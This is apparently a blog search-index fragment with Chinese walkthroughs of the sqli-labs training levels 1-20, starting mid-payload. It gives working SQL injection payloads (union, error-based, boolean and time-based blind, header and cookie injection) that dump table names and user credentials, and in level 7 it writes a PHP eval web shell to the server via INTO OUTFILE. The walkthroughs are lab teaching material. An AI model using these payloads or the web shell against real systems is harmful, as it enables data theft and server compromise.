information_schema.tables where table_schema=database() )))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/4.png" alt="img"></p><p>只可以看到一部分表，我们使用 not in 就可以看到其他表了</p><pre class="line-numbers language-none"><code class="language-none">payload= uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in ('emails'))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/5.png" alt="img"></p><p>可以看到没有多余的表了</p><p><strong>爆列名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/6.png" alt="img"></p><p>我们用同样的方法查看剩余的列</p><pre class="line-numbers language-none"><code class="language-none">payload=uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'  and column_name not in ('user','CURRENT_CONNECTIONS','TOTAL_CONNECTIONS'))))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/7.png" alt="img"></p><p><strong>爆字段</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/8.png" alt="img"></p><p>同样可以查看剩余字段</p><pre class="line-numbers language-none"><code class="language-none">payload=uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you','Angelina'))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/9.png"></p><p><strong>方法二联合查询union select</strong></p><p>uname是错误的才能显示联合查询内容</p><p>uname=0’ union select 1,2–+</p><p><img src="/2021/03/20/sqli-labs11-20/10.png" alt="img"></p><p>然后就是基本的联合查询</p><h2 id="第十二关（基于错误的双引号POST字符型变形注入）"><a href="#第十二关（基于错误的双引号POST字符型变形注入）" class="headerlink" title="第十二关（基于错误的双引号POST字符型变形注入）"></a><strong>第十二关（基于错误的双引号POST字符型变形注入）</strong></h2><p>我们输入”报错说明可能存在注入，但是输入–+后仍然报错</p><p><img src="/2021/03/20/sqli-labs11-20/11.png" alt="img"></p><p>后经过尝试  发现为”)闭合</p><p><img src="/2021/03/20/sqli-labs11-20/12.png" alt="img"></p><p>方法同十一关</p><h2 id="第十三关（POST单引号变形双注入）"><a href="#第十三关（POST单引号变形双注入）" class="headerlink" title="第十三关（POST单引号变形双注入）"></a><strong>第十三关（POST单引号变形双注入）</strong></h2><p>经过尝试发现闭合符为’)</p><p><img src="/2021/03/20/sqli-labs11-20/13.png" alt="img"></p><p>发现没有登陆成功返回信息，判断需要盲注</p><p><strong>方法一报错注入</strong></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/14.png" alt="img"></p><p>接下来就是爆表名、爆列名、爆字段</p><p><strong>方法二时间延迟型注入</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在明显延迟</p><h2 id="第十四关（POST双引号注入）"><a href="#第十四关（POST双引号注入）" class="headerlink" title="第十四关（POST双引号注入）"></a><strong>第十四关（POST双引号注入）</strong></h2><p>经过测试，发现闭合符为”</p><p><strong>方法一报错注入</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin" and extractvalue(1,concat(0x7e,(select database())))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>……</p><p><strong>方法二时间延迟型盲注</strong></p><h2 id="第十五关（基于bool型-时间延迟型单引号POST盲注）"><a href="#第十五关（基于bool型-时间延迟型单引号POST盲注）" class="headerlink" title="第十五关（基于bool型/时间延迟型单引号POST盲注）"></a><strong>第十五关（基于bool型/时间延迟型单引号POST盲注）</strong></h2><p>经过尝试 发现为单引号’闭合</p><p><img src="/2021/03/20/sqli-labs11-20/15.png" alt="img"></p><p><strong>方法一布尔型</strong></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select database()),8)='security' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/16.png" alt="img"></p><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/17.png" alt="img"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='username'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/18.png" alt="img"></p><p><strong>爆字段</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select username from security.users order by id limit 0,1),5)='dumb'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/19.png" alt="img"></p><p>密码同上</p><p><strong>方法二时间延迟型盲注</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/20.png" alt="img"></p><p>出现明显延迟，步骤不在赘述</p><h2 id="第十六关（基于bool型-时间延迟型双引号POST盲注）"><a href="#第十六关（基于bool型-时间延迟型双引号POST盲注）" class="headerlink" title="第十六关（基于bool型/时间延迟型双引号POST盲注）"></a><strong>第十六关（基于bool型/时间延迟型双引号POST盲注）</strong></h2><p>经过尝试闭合符为双引号加括号”)</p><p><img src="/2021/03/20/sqli-labs11-20/21.png" alt="img"></p><p>方法同上</p><h2 id="第十七关（基于错误的更新查询POST注入）"><a href="#第十七关（基于错误的更新查询POST注入）" class="headerlink" title="第十七关（基于错误的更新查询POST注入）"></a><strong>第十七关（基于错误的更新查询POST注入）</strong></h2><p>对uname做了check_input的处理，处理如下 在magic_quotes_gpc = On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。 stripslashes()删除由 addslashes() 函数添加的反斜杠 ctype_digit()判断是不是数字，是数字就返回true，否则返回false mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。 intval()   整型转换 </p><p>我靠做了这么多花里胡哨的过滤，你怎么没对password也搞一次？</p><p>针对password爆破 <strong>报错注入</strong></p><p>发现闭合符为单引号’</p><p><img src="/2021/03/20/sqli-labs11-20/22.png" alt="img"></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">admin' and extractvalue(1,concat(0x7e,(select database())))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/23.png" alt="img"></p><p><strong>爆表名</strong></p><p><strong>此payload中，passwd后必须是数字，输入字母就会出现如下问题，经过尝试发现，但不知道原理</strong></p><p><img src="/2021/03/20/sqli-labs11-20/24.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/25.png" alt="img"></p><p><strong>爆列名</strong> </p><pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema. columns where table_name='users' and column_name not in ('user','CURRENT_CONNECTIONS','TOTAL_CONNECTIONS'))))--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/26.png" alt="img"></p><p><strong>不再赘述</strong></p><h2 id="第十八关（基于错误的用户代理，头部POST注入）"><a href="#第十八关（基于错误的用户代理，头部POST注入）" class="headerlink" title="第十八关（基于错误的用户代理，头部POST注入）"></a><strong>第十八关（基于错误的用户代理，头部POST注入）</strong></h2><p><img src="/2021/03/20/sqli-labs11-20/27.png" alt="img"></p><p>我们看到有user-angent回显，猜测注入点在此处。</p><p>经过尝试，发现此题相对于上题把username和password都做了check，所以我们就把目标放user-angent。</p><p>经尝试发现闭合符为单引号’</p><p><img src="/2021/03/20/sqli-labs11-20/28.png" alt="img"></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">'  and extractvalue(1,concat(0x7e,(select database()))) and'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/29.png" alt="img"></p><p>不在赘述</p><h2 id="第十九关（基于头部的referer-POST报错注入）"><a href="#第十九关（基于头部的referer-POST报错注入）" class="headerlink" title="第十九关（基于头部的referer POST报错注入）"></a><strong>第十九关（基于头部的referer POST报错注入）</strong></h2><p>可以看出回显是referer字段，所以我们判断注入点在这；经过尝试，发现闭合符为单引号’</p><p><img src="/2021/03/20/sqli-labs11-20/30.png" alt="img"></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">' and extractvalue(1,concat(0x7e,(select database()))) and'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/31.png" alt="img"></p><p>不再赘述</p><h2 id="第二十关（基于错误的cookie头部POST注入）"><a href="#第二十关（基于错误的cookie头部POST注入）" class="headerlink" title="第二十关（基于错误的cookie头部POST注入）"></a><strong>第二十关（基于错误的cookie头部POST注入）</strong></h2><p>登陆后界面</p><p><img src="/2021/03/20/sqli-labs11-20/32.png" alt="img"></p><p>看到存在字段cookie，那我们就尝试在这里注入</p><p>抓个包看下</p><p><img src="/2021/03/20/sqli-labs11-20/33.png" alt="img"></p><p>看到 cookie：uname=admin  我们就在这里进行注入</p><p>经尝试发现闭合符为单引号’</p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">admin' and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/34.png" alt="img"></p><p>不再赘述</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs1-10</title>
      <link href="/2021/02/16/sqli-labs1-10/"/>
      <url>/2021/02/16/sqli-labs1-10/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关（1-10）"><a href="#sqli-labs通关（1-10）" class="headerlink" title="sqli-labs通关（1-10）"></a>sqli-labs通关（1-10）</h1><span id="more"></span><pre class="line-numbers language-none"><code class="language-none">-- （这里有一个空格，--空格）在SQL内表示注释，但在URL中，如果在最后加上-- ，浏览器 在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码 后会变成空格。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">1.闭合符有单引号、双引号、单引号加括号、双引号加括号等2.payload即我们要输入的sql查询语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="第一关（基于错误的GET单引号字符型注入）"><a href="#第一关（基于错误的GET单引号字符型注入）" class="headerlink" title="第一关（基于错误的GET单引号字符型注入）"></a><strong>第一关（基于错误的GET单引号字符型注入）</strong></h2><p>手工UNION联合查询注入</p><p>   <strong>1.根据提示输入id作为带数值的参数</strong></p><p>输入后</p><p><img src="/2021/02/16/sqli-labs1-10/1.png"></p><p><strong>2.判断注入类型</strong>  </p><p>输入 and 1=2无反应，说明不是数字型</p><p>输入单引号报错</p><p><img src="/2021/02/16/sqli-labs1-10/2.png" alt="img"></p><p>但是输入–+注释后又正常，说明此处为单引号字符型注入</p><p><strong>3.判断列数</strong></p><p>使用order by判断列数，order by 3正常  order by4不正常</p><p>说明有三列</p><p><img src="/2021/02/16/sqli-labs1-10/3.png" alt="img"></p><p><strong>4.使用联合查询（id值应不存在）爆出数据库名 表明 列名</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/4.png" alt="img"></p><p>可以看出2 3出有回显  我们在此处进行sql注入</p><p>爆数据库名</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),user()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/5.png" alt="img"></p><p>可以看出数据库名为 security  用户为root</p><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema ='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/6.png" alt="img"></p><p><strong>爆列名</strong></p><p>将所有表列名爆一遍发现users存在可以用信息username和password</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name ='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/7.png" alt="img"></p><p><strong>爆字段</strong></p><p>分别爆出username 和password</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(username) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/8.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(password) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/9.png" alt="img"></p><p>至此第一关结束。</p><h2 id="第二关（基于错误的GET型注入）"><a href="#第二关（基于错误的GET型注入）" class="headerlink" title="第二关（基于错误的GET型注入）"></a><strong>第二关（基于错误的GET型注入）</strong></h2><p><strong>1.根据提示输入id作为带数值的参数</strong></p><p><img src="/2021/02/16/sqli-labs1-10/10.png" alt="img"></p><p><strong>2.判断注入类型</strong></p><p>输入 and 1=2页面消失说明为数字型</p><pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/11.png" alt="img"></p><p><strong>3.判断列数</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1 order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/12.png" alt="img"></p><p>经尝试发现存在3列</p><p><strong>4.联合查询（在and 1=2下）</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=2 union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/13.png" alt="img"></p><p>之后按照步骤依次爆出数据库、表名、列名、字段</p><p>参考第一关</p><h2 id="第三关（基于错误的GET单引号变形字符输入）"><a href="#第三关（基于错误的GET单引号变形字符输入）" class="headerlink" title="第三关（基于错误的GET单引号变形字符输入）"></a><strong>第三关（基于错误的GET单引号变形字符输入）</strong></h2><p><strong>1.根据提示输入id作为带数值的参数</strong></p><p><strong>2.判断注入类型</strong></p><p>输入单引号报错，根据提示输入的内容被放到一对单引号加圆括号中了，猜想输入的1在数据库的位置形如：select…from…where id=’(1)’,在id=1’后加上后括号)进行注入</p><p><strong>3.判断列数</strong></p><p><strong>4.联合查询（在id不存在下）</strong></p><h2 id="第四关（基于错误的GET双引号字符输入）"><a href="#第四关（基于错误的GET双引号字符输入）" class="headerlink" title="第四关（基于错误的GET双引号字符输入）"></a><strong>第四关（基于错误的GET双引号字符输入）</strong></h2><p><strong>1.根据提示输入id</strong></p><p><strong>2.判断注入类型</strong></p><p>输入单引号无反应，输入and 1=2无反应</p><p>输入双引号报错，根据提示输入内容被放入一对双引号加圆括号中，猜想输入的1在数据库的位置形如：</p><p>select…from..where id=”(1)”,在id=1”后加上后括号)进行注入</p><p><strong>3.判断列数</strong></p><p><strong>4.联合查询（在id不存在下）</strong></p><h2 id="第五关（双注入GET单引号字符注入）"><a href="#第五关（双注入GET单引号字符注入）" class="headerlink" title="第五关（双注入GET单引号字符注入）"></a><strong>第五关（双注入GET单引号字符注入）</strong></h2><p><strong>根据提示输入id</strong></p><p><img src="/2021/02/16/sqli-labs1-10/14.png" alt="img"></p><p>看到此报错信息，第一反应就是布尔型盲注、报错型注入、时间延迟型盲注</p><p>下面给出验证时间延迟型盲注：</p><pre class="line-numbers language-none"><code class="language-none">?id=1' and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现有明显延迟</p><p><img src="/2021/02/16/sqli-labs1-10/15.png" alt="img"></p><p>接下来思路是通过延迟依次爆出数据库长度、数据库名、表名、列名、字段</p><p><strong>方法一：延迟型手工注入：</strong></p><p>此注入正确会延迟，错误没有延迟。id无所谓，因为不看回显，通过浏览器的刷新提示观察延迟情况，但是id正确时有利于观察。</p><p><strong>时间延迟型</strong>和<strong>报错型</strong>payload核心部分构造相同。</p><pre class="line-numbers language-none"><code class="language-none">时间延迟型payload= ?id=1' and if(报错型payload核心部分，sleep(5),1)--+爆库长payload= ?id=1' and if(length(database())=8,sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/16.png" alt="img"></p><p>当为8时出现明显延迟，库长为8</p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">爆库名payload=?id=1' and if(left(database(),1)='s',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/17.png" alt="img"></p><p>出现明显延迟，说明数据库名第一位为’s’,接下来以此增加 left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，出现延迟则正确。最终得到left(database(),8)=’security’</p><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">爆表名payload= ?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>limit1,1意思是从第二个数据开始取一个数据，即指第二个表名</p><p>分解如下</p><p>sql/Less-5/?id=1’ and if(语句,1)=’r’,sleep(5),1) 语句= left((select table_name from information_schema.tables where table_schema=database() limit 1,1)</p><p>经过很长时间努力，发现第四个表名为users，</p><pre class="line-numbers language-none"><code class="language-none">payload=?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>limit 3,1的意思是从第四个数据开始取一个数据，即指第四个表名users</p><p><img src="/2021/02/16/sqli-labs1-10/18.png" alt="img"></p><p><strong>爆列名</strong></p><p>经过很长时间发现第五个跟第六个列名分别为username和psssword,payload分别如下</p><pre class="line-numbers language-none"><code class="language-none">username payload= ?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='username',sleep(5),1)--+password payload= ?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>爆字段</strong></p><pre class="line-numbers language-none"><code class="language-none">username payload= ?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+ password payload= ?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>按照id排序，这样便于对应。注意limit 从0开始.最后爆破到第一个用户的名字dumb， 密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb</p><p>此方法需花费大量时间，建议使用sqlmap</p><p><strong>方法二：布尔型手工注入：</strong></p><p>在此注入中，正确会回显，错误没有回显，以此为依据逐字爆破，<strong>注意id=1</strong></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= ?id=1' and left((select database()),1)='s'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>手工注入时，可以使用left((select database()),1)&lt;’t’ 使用二分法快速爆破</p><p><img src="/2021/02/16/sqli-labs1-10/19.png" alt="img"></p><p>经过长时间努力发现库名为 security</p><pre class="line-numbers language-none"><code class="language-none">payload= ?id=1' and left((select database()),8)='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= ?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>爆列名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= ?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='username'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>爆字段</strong></p><pre class="line-numbers language-none"><code class="language-none">username payload= ?id=1' and left((select username from security.users order by id limit 0,1 ),4)='dumb'--+ password payload= ?id=1' and left((select password from security.users order by id limit 0,1),4)='dumb'--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>按照id排序，这样便于对应。注意limit 从0开始.最后爆破到第一个用户的名字dumb， 密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb</p><p><strong>方法三：报错注入</strong></p><pre class="line-numbers language-none"><code class="language-none">三种常用的报错注入语句  1.通过floor报错 and (select 1 from (select count(*),concat(( payload),floor (rand(0)*2))x from information_schema.tables group by x)a)  该语句将输出字符长度限制为64个字  2.通过updatexml报错 and updatexml(1, payload,1)  输出的字符长度也做了限制，其最长输出32位  并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效  3.通过ExtractValue报错 and extractvalue(1, payload)  输出字符有长度限制，最长32位。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们使用floor报错语句进行注入(使用limit 方法输出)</p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 4,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select schema_name from information_schema.schemata limit 4,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/20.png" alt="img"></p><p>1是floor语句输出的一部分，不管输出什么结果都有1</p><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select table_name from information_schema.tables where table_schema=database() limit 3,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select table_name from information_schema.tables where table_schema=database() limit 3,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/21.png" alt="img"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select column_name from information_schema.columns where table_name='users' limit 4,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select column_name from information_schema.columns where table_name='users' limit 4,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/22.png" alt="img"></p><p><strong>爆字段</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select username from security.users limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select username from security.users limit 0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/23.png" alt="img"></p><p>password同理</p><h2 id="第六关（双注入GET双引号字符型注入）"><a href="#第六关（双注入GET双引号字符型注入）" class="headerlink" title="第六关（双注入GET双引号字符型注入）"></a><strong>第六关（双注入GET双引号字符型注入）</strong></h2><p>   此关与第五关类似，却别是使用””的方式闭合字符串</p><p>只需将id=1’ 改为?id=1”即可</p><h2 id="第七关（导出文件GET字符型注入）"><a href="#第七关（导出文件GET字符型注入）" class="headerlink" title="第七关（导出文件GET字符型注入）"></a><strong>第七关（导出文件GET字符型注入）</strong></h2><p>数据库file和into outfile命令： 数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限 into outfile命令使用时我们必须知道，服务器上一个可以写入文件的文件夹的完整路径</p><p>判断注入点：</p><ol><li>首先我们输入?id=1观察页面</li></ol><p><img src="/2021/02/16/sqli-labs1-10/24.png" alt="img"></p><p>2.然后我们输入and 1=2页面正常  图同1</p><p>3.接下来我们输入单引号’报错，说明可能存在注入</p><p><img src="/2021/02/16/sqli-labs1-10/25.png" alt="img"></p><p>4.然而当我们输入 ?id=1’–+页面依然出错 图同3</p><p>5.接着我们尝试输入?id=1’)–+ 页面依然出错 图同3</p><p>6.接着我们尝试输入?id=1’))–+ 发现页面终于正常</p><p><img src="/2021/02/16/sqli-labs1-10/26.png" alt="img"></p><p>由于本题提示是导出文件GET字符型注入</p><p>然后我们尝试写入文件</p><pre class="line-numbers language-none"><code class="language-none">payload=   注意使用\\ ?id=1')) union select 1,2,3 into outfile "具体的文件夹路径\\xx.php"--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>虽然报错但是我们查询文件夹发现文件创建成功</p><p><img src="/2021/02/16/sqli-labs1-10/27.png" alt="img"></p><p><img src="/2021/02/16/sqli-labs1-10/28.png" alt="img"></p><p>接着我们上传一句话木马</p><p>需要注意的是我们使用file权限向操作系统写入文件时，对于相同的文件名的文件不能覆盖，所 以如果第一次上传yuan.php，下次再上传yuan.php时就是无效命令了，新的yuan.php不会覆盖 原有的yuan.php</p><pre class="line-numbers language-none"><code class="language-none">http://sql/Less-7/?id=1')) union select 1,"&lt;?php @eval($_POST['chopper']);?&gt;",3 into outfile"D:\\phpstudy_pro\\WWW\\sqli-labs-master\\yuan1.php"--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/16/sqli-labs1-10/29.png" alt="img"></p><p>接着我们使用蚁剑连接</p><p><img src="/2021/02/16/sqli-labs1-10/30.png" alt="img"></p><p><img src="/2021/02/16/sqli-labs1-10/31.png" alt="img"></p><p>成功连接！</p><h2 id="第八关（布尔型单引号GET型盲注）"><a href="#第八关（布尔型单引号GET型盲注）" class="headerlink" title="第八关（布尔型单引号GET型盲注）"></a><strong>第八关（布尔型单引号GET型盲注）</strong></h2><p>参考第五关布尔型注入</p><p>经过尝试发现为单引号注入</p><p><img src="/2021/02/16/sqli-labs1-10/32.png" alt="img"></p><p>接下来爆库名、表名、列名、字段</p><p>payload参考第五关</p><h2 id="第九关（基于时间的GET单引号盲注）"><a href="#第九关（基于时间的GET单引号盲注）" class="headerlink" title="第九关（基于时间的GET单引号盲注）"></a><strong>第九关（基于时间的GET单引号盲注）</strong></h2><p>参考第五关时间延迟型盲注</p><p>经过尝试发现不管输入什么都无反应，考虑时间延迟型注入</p><p>?id=1’ and sleep(5)–+</p><p>发现明显延迟</p><p>接下来爆库名、表名、列名、字段</p><p>payload参考第五关</p><h2 id="第十关（基于时间的双引号盲注）"><a href="#第十关（基于时间的双引号盲注）" class="headerlink" title="第十关（基于时间的双引号盲注）"></a><strong>第十关（基于时间的双引号盲注）</strong></h2><p>在输入 ?id=1” and sleep(8)–+ 时发现明显延迟</p><p>接下来爆库名、表名、列名、字段</p><p>payload参考第五关</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page1 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
